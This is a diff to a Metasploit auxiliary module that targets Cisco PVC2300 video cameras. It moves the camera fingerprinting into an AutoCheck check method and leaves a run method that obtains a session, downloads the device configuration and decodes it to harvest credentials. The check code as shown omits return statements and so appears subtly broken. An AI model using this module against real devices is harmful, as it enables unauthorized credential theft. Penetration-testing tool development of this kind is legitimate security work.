@@ -4,6 +4,7 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
+  prepend Msf::Exploit::Remote::AutoCheck
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -201,19 +202,23 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def run
+  def check
     res = send_request_cgi('uri' => normalize_uri(target_uri.path))
 
     unless res
-      fail_with(Failure::Unknown, 'Connection failed')
+      Exploit::CheckCode::Unknown('Target is unreachable.')
     end
 
     # string togetether a few checks to make it more likely we're dealing with a Cisco camera
     unless res.code == 401 && res.headers.include?('WWW-Authenticate') && res.headers['WWW-Authenticate'] == 'Basic realm="IP Camera"'
-      fail_with(Failure::NoTarget, 'Target is not a Cisco PVC2300 POE Video Camera')
+      Exploit::CheckCode::Safe('Target is not a Cisco PVC2300 POE Video Camera')
     end
-    vprint_status('Target seems to be a Cisco camera')
 
+    vprint_status('Target seems to be a Cisco camera')
+    Exploit::CheckCode::Appears
+  end
+
+  def run
     session_id = request_session_id
     config_file = download_config_file(session_id)
     decode_config_file(config_file)
